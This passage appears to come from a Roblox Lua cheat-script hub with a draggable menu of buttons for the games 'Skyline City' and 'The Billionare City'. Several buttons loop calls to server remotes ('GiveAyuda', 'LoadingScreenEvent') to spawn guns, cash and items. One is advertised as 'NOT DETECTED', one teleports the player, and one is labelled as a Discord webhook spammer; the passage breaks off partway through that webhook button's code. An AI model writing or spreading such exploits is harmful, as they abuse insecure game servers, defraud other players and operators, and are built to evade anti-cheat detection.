TitleBar.BorderSizePixel = 0
TitleBar.ZIndex = 2
TitleBar.Parent = MainFrame

local TitleBarCorner = Instance.new("UICorner")
TitleBarCorner.CornerRadius = UDim.new(0, 8)
TitleBarCorner.Parent = TitleBar

local TitleBarFix = Instance.new("Frame")
TitleBarFix.Size = UDim2.new(1, 0, 0, 10)
TitleBarFix.Position = UDim2.new(0, 0, 1, -10)
TitleBarFix.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TitleBarFix.BorderSizePixel = 0
TitleBarFix.ZIndex = 2
TitleBarFix.Parent = TitleBar

local TitleLabel = Instance.new("TextLabel")
TitleLabel.Size = UDim2.new(1, 0, 1, 0)
TitleLabel.Position = UDim2.new(0, 0, 0, 0)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "// @ Monsy"
TitleLabel.TextColor3 = Color3.fromRGB(20, 20, 20)
TitleLabel.TextSize = 17
TitleLabel.Font = Enum.Font.RobotoMono
TitleLabel.TextXAlignment = Enum.TextXAlignment.Center
TitleLabel.ZIndex = 3
TitleLabel.Parent = TitleBar

local StorageBtn = Instance.new("TextButton")
StorageBtn.Size = UDim2.new(0, 180, 0, 36)
StorageBtn.Position = UDim2.new(0.5, -90, 0, 52)
StorageBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
StorageBtn.Text = "STORAGE"
StorageBtn.TextColor3 = Color3.fromRGB(20, 20, 20)
StorageBtn.TextSize = 17
StorageBtn.Font = Enum.Font.RobotoMono
StorageBtn.BorderSizePixel = 0
StorageBtn.ZIndex = 2
StorageBtn.Parent = MainFrame

local StorageBtnCorner = Instance.new("UICorner")
StorageBtnCorner.CornerRadius = UDim.new(0, 6)
StorageBtnCorner.Parent = StorageBtn

local StorageBtnStroke = Instance.new("UIStroke")
StorageBtnStroke.Color = Color3.fromRGB(20, 20, 20)
StorageBtnStroke.Thickness = 0
StorageBtnStroke.Parent = StorageBtn

StorageBtn.MouseButton1Click:Connect(function()
    local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if hrp then
        StorageBtn.Text = "Teleporting"
        hrp.CFrame = CFrame.new(410.1230773925781, 7.36732292175293, 1254.871826171875)
        task.wait(0.5)
        StorageBtn.Text = "STORAGE"
    end
end)

local dragging = false
local dragInput, mousePos, framePos

TitleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        mousePos = input.Position
        framePos = MainFrame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

TitleBar.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        local delta = input.Position - mousePos
        MainFrame.Position = UDim2.new(
            framePos.X.Scale,
            framePos.X.Offset + delta.X,
            framePos.Y.Scale,
            framePos.Y.Offset + delta.Y
        )
    end
end)
end)

addMainMenuButton("SKYLINE CITY STORAGE CHECK (MONSY)", function()
    -- Inventory Check GUI
-- Draggable | White GUI | Black Text | Roboto Mono Font

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

-- === MAIN SCREEN GUI ===
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "InventoryChecker"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = PlayerGui

-- === MAIN FRAME ===
local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 340, 0, 330)
MainFrame.Position = UDim2.new(0.5, -170, 0.5, -210)
MainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainFrame.BorderSizePixel = 0
MainFrame.ClipsDescendants = true
MainFrame.Parent = ScreenGui

-- Corner Radius
local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 8)
UICorner.Parent = MainFrame

-- Drop Shadow (fake via another frame behind)
local Shadow = Instance.new("Frame")
Shadow.Name = "Shadow"
Shadow.Size = UDim2.new(1, 8, 1, 8)
Shadow.Position = UDim2.new(0, -4, 0, 4)
Shadow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Shadow.BackgroundTransparency = 0.75
Shadow.BorderSizePixel = 0
Shadow.ZIndex = MainFrame.ZIndex - 1
Shadow.Parent = MainFrame

local ShadowCorner = Instance.new("UICorner")
ShadowCorner.CornerRadius = UDim.new(0, 10)
ShadowCorner.Parent = Shadow

-- === TITLE BAR ===
local TitleBar = Instance.new("Frame")
TitleBar.Name = "TitleBar"
TitleBar.Size = UDim2.new(1, 0, 0, 44)
TitleBar.Position = UDim2.new(0, 0, 0, 0)
TitleBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TitleBar.BorderSizePixel = 0
TitleBar.ZIndex = 2
TitleBar.Parent = MainFrame

local TitleBarCorner = Instance.new("UICorner")
TitleBarCorner.CornerRadius = UDim.new(0, 8)
TitleBarCorner.Parent = TitleBar

-- Fix bottom corners of TitleBar
local TitleBarFix = Instance.new("Frame")
TitleBarFix.Size = UDim2.new(1, 0, 0, 10)
TitleBarFix.Position = UDim2.new(0, 0, 1, -10)
TitleBarFix.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TitleBarFix.BorderSizePixel = 0
TitleBarFix.ZIndex = 2
TitleBarFix.Parent = TitleBar

-- Title Text
local TitleLabel = Instance.new("TextLabel")
TitleLabel.Name = "TitleLabel"
TitleLabel.Size = UDim2.new(1, -50, 1, 0)
TitleLabel.Position = UDim2.new(0, 14, 0, 0)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "[ INVENTORY CHECK ]"
TitleLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TitleLabel.TextSize = 13
TitleLabel.Font = Enum.Font.RobotoMono
TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
TitleLabel.ZIndex = 3
TitleLabel.Parent = TitleBar

-- Close Button
local CloseButton = Instance.new("TextButton")
CloseButton.Name = "CloseButton"
CloseButton.Size = UDim2.new(0, 28, 0, 28)
CloseButton.Position = UDim2.new(1, -36, 0.5, -14)
CloseButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CloseButton.Text = "x"
CloseButton.TextColor3 = Color3.fromRGB(0, 0, 0)
CloseButton.TextSize = 12
CloseButton.Font = Enum.Font.RobotoMono
CloseButton.BorderSizePixel = 0
CloseButton.ZIndex = 4
CloseButton.Parent = TitleBar

local CloseCorner = Instance.new("UICorner")
CloseCorner.CornerRadius = UDim.new(0, 5)
CloseCorner.Parent = CloseButton

-- === REFRESH BUTTON ===
local RefreshButton = Instance.new("TextButton")
RefreshButton.Name = "RefreshButton"
RefreshButton.Size = UDim2.new(1, -20, 0, 34)
RefreshButton.Position = UDim2.new(0, 10, 0, 52)
RefreshButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
RefreshButton.Text = "⟳  REFRESH INVENTORY"
RefreshButton.TextColor3 = Color3.fromRGB(0, 0, 0)
RefreshButton.TextSize = 12
RefreshButton.Font = Enum.Font.RobotoMono
RefreshButton.BorderSizePixel = 0
RefreshButton.ZIndex = 2
RefreshButton.Parent = MainFrame

local RefreshCorner = Instance.new("UICorner")
RefreshCorner.CornerRadius = UDim.new(0, 6)
RefreshCorner.Parent = RefreshButton

-- === ITEM COUNT LABEL ===
local CountLabel = Instance.new("TextLabel")
CountLabel.Name = "CountLabel"
CountLabel.Size = UDim2.new(1, -20, 0, 22)
CountLabel.Position = UDim2.new(0, 10, 0, 94)
CountLabel.BackgroundTransparency = 1
CountLabel.Text = "Total Items: 0"
CountLabel.TextColor3 = Color3.fromRGB(20, 20, 20)
CountLabel.TextSize = 11
CountLabel.Font = Enum.Font.RobotoMono
CountLabel.TextXAlignment = Enum.TextXAlignment.Left
CountLabel.ZIndex = 2
CountLabel.Parent = MainFrame

-- === SCROLL FRAME ===
local ScrollFrame = Instance.new("ScrollingFrame")
ScrollFrame.Name = "ScrollFrame"
ScrollFrame.Size = UDim2.new(1, -20, 1, -130)
ScrollFrame.Position = UDim2.new(0, 10, 0, 122)
ScrollFrame.BackgroundColor3 = Color3.fromRGB(245, 245, 245)
ScrollFrame.BorderSizePixel = 0
ScrollFrame.ScrollBarThickness = 4
ScrollFrame.ScrollBarImageColor3 = Color3.fromRGB(20, 20, 20)
ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
ScrollFrame.ZIndex = 2
ScrollFrame.Parent = MainFrame

local ScrollCorner = Instance.new("UICorner")
ScrollCorner.CornerRadius = UDim.new(0, 6)
ScrollCorner.Parent = ScrollFrame

local UIListLayout = Instance.new("UIListLayout")
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.Padding = UDim.new(0, 2)
UIListLayout.Parent = ScrollFrame

local UIPadding = Instance.new("UIPadding")
UIPadding.PaddingTop = UDim.new(0, 6)
UIPadding.PaddingLeft = UDim.new(0, 6)
UIPadding.PaddingRight = UDim.new(0, 6)
UIPadding.Parent = ScrollFrame

-- === FUNCTIONS ===

local function clearScroll()
    for _, child in ipairs(ScrollFrame:GetChildren()) do
        if child:IsA("Frame") or child:IsA("TextLabel") then
            child:Destroy()
        end
    end
end

local function addItemRow(name, quantity, index)
    local Row = Instance.new("Frame")
    Row.Name = "Row_" .. index
    Row.Size = UDim2.new(1, -6, 0, 28)
    Row.BackgroundColor3 = index % 2 == 0 and Color3.fromRGB(235, 235, 235) or Color3.fromRGB(255, 255, 255)
    Row.BorderSizePixel = 0
    Row.ZIndex = 3
    Row.Parent = ScrollFrame

    local RowCorner = Instance.new("UICorner")
    RowCorner.CornerRadius = UDim.new(0, 4)
    RowCorner.Parent = Row

    local ItemName = Instance.new("TextLabel")
    ItemName.Size = UDim2.new(0.72, 0, 1, 0)
    ItemName.Position = UDim2.new(0, 8, 0, 0)
    ItemName.BackgroundTransparency = 1
    ItemName.Text = name
    ItemName.TextColor3 = Color3.fromRGB(20, 20, 20)
    ItemName.TextSize = 11
    ItemName.Font = Enum.Font.RobotoMono
    ItemName.TextXAlignment = Enum.TextXAlignment.Left
    ItemName.TextTruncate = Enum.TextTruncate.AtEnd
    ItemName.ZIndex = 4
    ItemName.Parent = Row

    local ItemQty = Instance.new("TextLabel")
    ItemQty.Size = UDim2.new(0.25, 0, 1, 0)
    ItemQty.Position = UDim2.new(0.74, 0, 0, 0)
    ItemQty.BackgroundTransparency = 1
    ItemQty.Text = "x" .. quantity
    ItemQty.TextColor3 = Color3.fromRGB(20, 20, 20)
    ItemQty.TextSize = 11
    ItemQty.Font = Enum.Font.RobotoMono
    ItemQty.TextXAlignment = Enum.TextXAlignment.Right
    ItemQty.ZIndex = 4
    ItemQty.Parent = Row
end

local function getInventory()
    local inventoryData = {}

    -- Check Backpack
    local Backpack = LocalPlayer:FindFirstChild("Backpack")
    if Backpack then
        for _, item in ipairs(Backpack:GetChildren()) do
            if item:IsA("Tool") then
                local itemName = item.Name
                inventoryData[itemName] = (inventoryData[itemName] or 0) + 1
            end
        end
    end

    -- Check Character (equipped tools)
    local Character = LocalPlayer.Character
    if Character then
        for _, item in ipairs(Character:GetChildren()) do
            if item:IsA("Tool") then
                local itemName = item.Name
                inventoryData[itemName] = (inventoryData[itemName] or 0) + 1
            end
        end
    end

    return inventoryData
end

local function refreshInventory()
    clearScroll()
    local data = getInventory()
    local totalItems = 0
    local index = 0

    -- Sort alphabetically
    local sortedNames = {}
    for name, _ in pairs(data) do
        table.insert(sortedNames, name)
    end
    table.sort(sortedNames)

    if #sortedNames == 0 then
        local EmptyLabel = Instance.new("TextLabel")
        EmptyLabel.Size = UDim2.new(1, -12, 0, 30)
        EmptyLabel.BackgroundTransparency = 1
        EmptyLabel.Text = "No items found."
        EmptyLabel.TextColor3 = Color3.fromRGB(130, 130, 130)
        EmptyLabel.TextSize = 11
        EmptyLabel.Font = Enum.Font.RobotoMono
        EmptyLabel.ZIndex = 3
        EmptyLabel.Parent = ScrollFrame
    else
        for _, name in ipairs(sortedNames) do
            index = index + 1
            local qty = data[name]
            totalItems = totalItems + qty
            addItemRow(name, qty, index)
        end
    end

    -- Update canvas
    local contentSize = UIListLayout.AbsoluteContentSize
    ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, contentSize.Y + 12)

    CountLabel.Text = "Total Items: " .. totalItems .. "  |  Unique: " .. #sortedNames
end

-- === DRAGGABLE LOGIC ===
local dragging = false
local dragInput, mousePos, framePos

TitleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        mousePos = input.Position
        framePos = MainFrame.Position

        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

TitleBar.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

game:GetService("UserInputService").InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        local delta = input.Position - mousePos
        MainFrame.Position = UDim2.new(
            framePos.X.Scale,
            framePos.X.Offset + delta.X,
            framePos.Y.Scale,
            framePos.Y.Offset + delta.Y
        )
    end
end)

-- === BUTTON EVENTS ===
RefreshButton.MouseButton1Click:Connect(function()
    RefreshButton.Text = "⟳  SCANNING..."
    task.wait(0.2)
    refreshInventory()
    RefreshButton.Text = "⟳  REFRESH INVENTORY"
end)

CloseButton.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()
end)

-- === INIT ===
refreshInventory()
end)

local function addMainMenuButton(text, callback)
	local panel = allTabPanels["THE BILLIONARE"]
	if not panel then return end
	local btn = new("TextButton", {
		Size = UDim2.new(1, -16, 0, 38),
		BackgroundColor3 = Color3.fromRGB(245,245,245),
		TextColor3 = Color3.new(0,0,0),
		Font = Enum.Font.Roboto,
		TextSize = 14,
		Text = text,
		AutoButtonColor = false,
		Parent = panel,
	})
	new("UICorner", {CornerRadius = UDim.new(0,6), Parent = btn})

	btn.MouseEnter:Connect(function()
		local t = getThemeColors()
		local accent = t.accent or Color3.new(1,1,1)
		local hover = t.bg:Lerp(accent, 0.50)
		TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = hover}):Play()
	end)
	btn.MouseLeave:Connect(function()
		local t = getThemeColors()
		local accent = t.accent or Color3.new(1,1,1)
		local base = t.bg:Lerp(accent, 0.32)
		TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = base}):Play()
	end)

	btn.MouseButton1Click:Connect(function()
		clickSound:Play()
		callback()
	end)
end

--// 8 Buttons in Main Menu
addMainMenuButton("THE BILLIONARE CITY CRASH SERVER (WHITELISTED ONLY)", function()
	local Players = game:GetService("Players")
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local hrp = character:WaitForChild("HumanoidRootPart")

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.IgnoreGuiInset = true
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = game.CoreGui

local Image = Instance.new("ImageLabel")
Image.Size = UDim2.new(1,0,1,0)
Image.Position = UDim2.new(0,0,0,0)
Image.BackgroundTransparency = 1
Image.Image = "rbxassetid://92062079482012"
Image.ZIndex = 99999
Image.Parent = ScreenGui

task.delay(0.001, function()
    player:Kick("PA WHITELIST KAMUNA BOI\n@: gg.publicxenemy\n@: xxxcxz")
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("THE BILLIONARE CITY SPAWN GUN (MONSY)", function()
    local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer

local gui = Instance.new("ScreenGui")
gui.Name = ""
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

-- Main Frame (White)
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 360, 0, 340)
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.Position = UDim2.new(0.5, 0, 0.5, 0)
frame.BackgroundColor3 = Color3.new(1,1,1)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = gui
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 16)

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 50)
title.BackgroundTransparency = 1
title.Text = "THE BILLIONAIRE CITY RP"
title.TextColor3 = Color3.new(0,0,0)
title.Font = Enum.Font.Roboto
title.TextSize = 22
title.Parent = frame

-- Dropdown Button
local dropdownBtn = Instance.new("TextButton")
dropdownBtn.Size = UDim2.new(1, -40, 0, 50)
dropdownBtn.Position = UDim2.new(0, 20, 0, 70)
dropdownBtn.BackgroundColor3 = Color3.new(1,1,1)
dropdownBtn.Text = "Select Item"
dropdownBtn.TextColor3 = Color3.new(0,0,0)
dropdownBtn.Font = Enum.Font.Roboto
dropdownBtn.TextSize = 18
dropdownBtn.TextXAlignment = Enum.TextXAlignment.Left
dropdownBtn.AutoButtonColor = false
dropdownBtn.Parent = frame
Instance.new("UICorner", dropdownBtn).CornerRadius = UDim.new(0, 12)

local padding = Instance.new("UIPadding", dropdownBtn)
padding.PaddingLeft = UDim.new(0, 15)

-- Dropdown List (ScrollingFrame)
local dropList = Instance.new("ScrollingFrame")
dropList.Size = UDim2.new(1, -40, 0, 180)
dropList.Position = UDim2.new(0, 20, 0, 130)
dropList.BackgroundColor3 = Color3.new(1,1,1)
dropList.BorderSizePixel = 0
dropList.ScrollBarThickness = 0
dropList.Visible = false
dropList.ZIndex = 10
dropList.Parent = frame
Instance.new("UICorner", dropList).CornerRadius = UDim.new(0, 12)

local listLayout = Instance.new("UIListLayout")
listLayout.Padding = UDim.new(0, 4)
listLayout.Parent = dropList

-- Items
local items = {
    ".50 Pink", "Balistic Knife", "Blueprint", "Combat PD",
    "Hoverboard", "LockPick", "PD Cuff", "Rock",
    "PistolBody", "SharkFang", "SharkBone", "TASER",
    "Stone", "Oxy Pill", "SwitchBlade"
}

local selectedItem = nil

for _, itemName in ipairs(items) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, -10, 0, 42)
    btn.BackgroundColor3 = Color3.new(1,1,1)
    btn.Text = itemName
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Roboto
    btn.TextSize = 16
    btn.TextXAlignment = Enum.TextXAlignment.Left
    btn.AutoButtonColor = false
    btn.ZIndex = 11
    btn.Parent = dropList

    local pad = Instance.new("UIPadding", btn)
    pad.PaddingLeft = UDim.new(0, 15)

    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 10)

    btn.MouseButton1Click:Connect(function()
        selectedItem = itemName
        dropdownBtn.Text = itemName
        dropList.Visible = false
    end)
end

dropList.CanvasSize = UDim2.new(0, 0, 0, #items * 46)

-- Toggle dropdown
dropdownBtn.MouseButton1Click:Connect(function()
    dropList.Visible = not dropList.Visible
end)

-- Auto Buy Button
local autoBuy = Instance.new("TextButton")
autoBuy.Size = UDim2.new(1, -40, 0, 55)
autoBuy.Position = UDim2.new(0, 20, 1, -20)
autoBuy.AnchorPoint = Vector2.new(0, 1)
autoBuy.BackgroundColor3 = Color3.new(1,1,1)
autoBuy.Text = "START AUTO BUY"
autoBuy.TextColor3 = Color3.new(0,0,0)
autoBuy.Font = Enum.Font.Roboto
autoBuy.TextSize = 20
autoBuy.AutoButtonColor = false
autoBuy.Parent = frame
Instance.new("UICorner", autoBuy).CornerRadius = UDim.new(0, 14)

-- Logic
local running = false
autoBuy.MouseButton1Click:Connect(function()
    running = not running
    autoBuy.Text = running and "STOP AUTO BUY" or "START AUTO BUY"

    if running and selectedItem then
        task.spawn(function()
            while running do
                ReplicatedStorage:WaitForChild("LoadingScreenEvent"):FireServer(selectedItem, 1, "Kaizeuuu")
                task.wait(0.001)
            end
        end)
    end
end)

-- RightShift to toggle GUI
UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("THE BILLIONARE CITY SPAWN CASH / GUN NOT DETECTED (NEW)", function()
    --// GUI CREATION
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(0, 260, 0, 230)
Frame.Position = UDim2.new(0.5, -130, 0.5, -115)
Frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
Frame.Active = true
Frame.Draggable = true
Frame.Parent = ScreenGui

local FrameCorner = Instance.new("UICorner")
FrameCorner.CornerRadius = UDim.new(0,15)
FrameCorner.Parent = Frame

-- TITLE (GRAFFITI-LIKE)
local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 35)
Title.BackgroundTransparency = 1
Title.Text = "MONSY"
Title.TextColor3 = Color3.fromRGB(0,0,0)
Title.Font = Enum.Font.Roboto
Title.TextSize = 26
Title.Parent = Frame

-- TEXTBOX
local TimeBox = Instance.new("TextBox")
TimeBox.Size = UDim2.new(0, 220, 0, 30)
TimeBox.Position = UDim2.new(0, 20, 0, 45)
TimeBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
TimeBox.TextColor3 = Color3.fromRGB(0,0,0)
TimeBox.PlaceholderText = "Enter seconds (ex: 30)"
TimeBox.Font = Enum.Font.Roboto
TimeBox.TextSize = 16
TimeBox.Parent = Frame

local BoxCorner = Instance.new("UICorner")
BoxCorner.CornerRadius = UDim.new(0,10)
BoxCorner.Parent = TimeBox

-- BUTTON CREATOR
local function createButton(name, y)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, 220, 0, 30)
    btn.Position = UDim2.new(0, 20, 0, y)
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.fromRGB(0,0,0)
    btn.Text = name
    btn.Font = Enum.Font.Roboto
    btn.TextSize = 16
    btn.Parent = Frame

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0,10)
    corner.Parent = btn

    return btn
end

local SpawnBtn = createButton("SPAWN ON / OFF", 85)
local NormalPBtn = createButton("NORMAL P", 130)
local OxyBtn = createButton("OXY PILL", 175)

-- AUTO STOP LOGIC
local running = false

SpawnBtn.MouseButton1Click:Connect(function()
    if running then
        running = false
        SpawnBtn.Text = "SPAWN ON / OFF"
        return
    end

    local secs = tonumber(TimeBox.Text)
    if not secs then
        TimeBox.Text = "INVALID"
        return
    end

    running = true
    SpawnBtn.Text = "RUNNING..."

    task.spawn(function()
        local stopTime = os.time() + secs
        while running and os.time() < stopTime do
            game:GetService("ReplicatedStorage").GiveAyuda:FireServer("Combat Pistol", -1)
            task.wait(0.001)
        end

        running = false
        SpawnBtn.Text = "SPAWN ON / OFF"
    end)
end)

-- NORMAL P BUTTON
NormalPBtn.MouseButton1Click:Connect(function()
    local args = {
        [1] = "Normal P";
        [2] = 50000;
        [3] = "devxzy01";
    }
    game:GetService("ReplicatedStorage"):WaitForChild("LoadingScreenEvent")
        :FireServer(unpack(args))
end)

-- OXY PILL BUTTON
OxyBtn.MouseButton1Click:Connect(function()
    local args = {
        [1] = "Oxy pill";
        [2] = 10000;
        [3] = "Kaizeuuu";
    }
    game:GetService("ReplicatedStorage"):WaitForChild("LoadingScreenEvent")
        :FireServer(unpack(args))
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("THE BILLIONARE CITY SPAWN CASH (MONSY)", function()
    -- LocalScript: MONEY GUI – Pure White + Black Text Only
-- Place in StarterPlayerScripts

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local gui = Instance.new("ScreenGui")
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

-- Main Frame (White na)
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 220, 0, 120)
frame.Position = UDim2.new(0.5, -110, 0.5, -60)
frame.BackgroundColor3 = Color3.new(1, 1, 1)  -- Pure white
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = gui

Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 16)

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 30)
title.Position = UDim2.new(0, 0, 0, 8)
title.BackgroundTransparency = 1
title.Text = "MONEY"
title.TextColor3 = Color3.new(0, 0, 0)  -- Black text
title.Font = Enum.Font.Roboto
title.TextSize = 18
title.Parent = frame

-- Money Amount
local moneyLabel = Instance.new("TextLabel")
moneyLabel.Size = UDim2.new(1, -20, 0, 25)
moneyLabel.Position = UDim2.new(0, 10, 0, 38)
moneyLabel.BackgroundTransparency = 1
moneyLabel.Text = "$0"
moneyLabel.TextColor3 = Color3.new(0, 0, 0)  -- Black na rin (walang green)
moneyLabel.Font = Enum.Font.Roboto
moneyLabel.TextSize = 20
moneyLabel.TextXAlignment = Enum.TextXAlignment.Left
moneyLabel.Parent = frame

-- CASH Button (White bg, black text)
local cashButton = Instance.new("TextButton")
cashButton.Size = UDim2.new(0, 80,0,30)
cashButton.Position = UDim2.new(1, -90, 1, -38)
cashButton.BackgroundColor3 = Color3.new(1,1,1)  -- White
cashButton.Text = "CASH"
cashButton.TextColor3 = Color3.new(0,0,0)  -- Black text
cashButton.Font = Enum.Font.Roboto
cashButton.TextSize = 14
cashButton.Parent = frame

Instance.new("UICorner", cashButton).CornerRadius = UDim.new(0, 8)

-- Toggle Switch (White/Gray lang)
local toggleFrame = Instance.new("Frame")
toggleFrame.Size = UDim2.new(0,40,0,20)
toggleFrame.Position = UDim2.new(0,10,1,-30)
toggleFrame.BackgroundColor3 = Color3.fromRGB(220,220,220)
toggleFrame.Parent = frame
Instance.new("UICorner", toggleFrame).CornerRadius = UDim.new(0,10)

local toggleButton = Instance.new("Frame")
toggleButton.Size = UDim2.new(0,16,0,16)
toggleButton.Position = UDim2.new(0,2,0.5,-8)
toggleButton.BackgroundColor3 = Color3.new(1,1,1)
toggleButton.Parent = toggleFrame
Instance.new("UICorner", toggleButton).CornerRadius = UDim.new(0,8)

-- Draggable (same pa rin)
local dragging, dragInput, dragStart, startPos
frame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		dragging = true
		dragStart = input.Position
		startPos = frame.Position
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then dragging = false end
		end)
	end
end)
frame.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement then
		dragInput = input
	end
end)
RunService.RenderStepped:Connect(function()
	if dragging and dragInput then
		local delta = dragInput.Position - dragStart
		frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
end)

-- Toggle Logic
local isOn = false
local connection

toggleFrame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		isOn = not isOn
		if isOn then
			toggleButton.Position = UDim2.new(1, -18, 0.5, -8)
			toggleFrame.BackgroundColor3 = Color3.fromRGB(200,200,200)  -- Light gray when ON
		else
			toggleButton.Position = UDim2.new(0, 2, 0.5, -8)
			toggleFrame.BackgroundColor3 = Color3.fromRGB(220,220,220)
		end

		if isOn then
			connection = RunService.Heartbeat:Connect(function()
				if ReplicatedStorage:FindFirstChild("GiveAyuda") then
					ReplicatedStorage.GiveAyuda:FireServer("Combat Pistol", -1)
				end
			end)
		else
			if connection then connection:Disconnect() end
		end
	end
end)

-- CASH Button
cashButton.MouseButton1Click:Connect(function()
	if ReplicatedStorage:FindFirstChild("GiveAyuda") then
		ReplicatedStorage.GiveAyuda:FireServer("Combat Pistol", -1)
	end
end)

-- Update Money
task.spawn(function()
	local stats = player:WaitForChild("leaderstats")
	local cash = stats:FindFirstChild("Cash") or stats:FindFirstChild("Money")
	if cash then
		moneyLabel.Text = "$"..cash.Value
		cash.Changed:Connect(function()
			moneyLabel.Text = "$"..cash.Value
		end)
	end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("THE BILLIONARE CITY CLICK TO REFRESH (MONSY)", function()
	local args = {
        [1] = "Male";
}

game:GetService("ReplicatedStorage"):WaitForChild("Morph", 9e9):FireServer(unpack(args))
end)

--// 8 Buttons in Main Menu
addMainMenuButton("THE BILLIONARE CITY SPAM WEBHOOK DISCORD (MONSY)", function()
    --========================================================--
-- AUTO BUY GUI
--========================================================--

local player = game.Players.LocalPlayer
local gui = Instance.new("ScreenGui")
gui.Name = ""
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

-- Main Frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 180, 0, 90)
frame.Position = UDim2.new(0.05, 0, 0.3, 0)
frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
frame.Active = true
frame.Draggable = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 12)
corner.Parent = frame

frame.Parent = gui

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 30)
title.BackgroundTransparency = 1
title.Text = "SPAM WEBHOOK"
title.TextColor3 = Color3.fromRGB(0, 0, 0)
title.Font = Enum.Font.Roboto
title.TextSize = 18
title.Parent = frame

-- Toggle Button
local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(1, -20, 0, 35)
toggle.Position = UDim2.new(0, 10, 0, 40)
